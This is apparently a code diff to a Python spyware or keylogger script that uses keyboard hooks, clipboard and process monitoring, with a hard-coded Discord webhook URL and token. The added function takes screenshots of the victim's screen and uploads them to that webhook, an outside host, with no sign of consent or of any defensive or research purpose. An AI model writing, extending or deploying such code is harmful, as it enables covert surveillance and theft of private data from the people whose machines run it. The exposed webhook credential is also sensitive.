@@ -6,6 +6,9 @@ import time
 from pynput import keyboard
 import psutil
 import pyperclip
+import pyautogui
+import io
+from datetime import datetime
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -159,6 +162,25 @@ def monitor_processes():
 
         running_processes = current_processes
         time.sleep(2)  # Check every 2 seconds
+
+def take_and_send_screenshot():
+    """Takes a screenshot and sends it to the Discord webhook."""
+    screenshot = pyautogui.screenshot()
+    img_bytes = io.BytesIO()
+    screenshot.save(img_bytes, format='PNG')
+    img_bytes.seek(0)
+    
+    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+    files = {'file': (f'screenshot_{timestamp}.png', img_bytes, 'image/png')}
+    
+    try:
+        response = requests.post(WEBHOOK_URL, files=files)
+        if response.status_code == 200:
+            print("Screenshot sent successfully.")
+        else:
+            print(f"Failed to send screenshot. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending screenshot: {e}")
 
 # Start process monitoring in a separate thread
 process_thread = threading.Thread(target=monitor_processes, daemon=True)
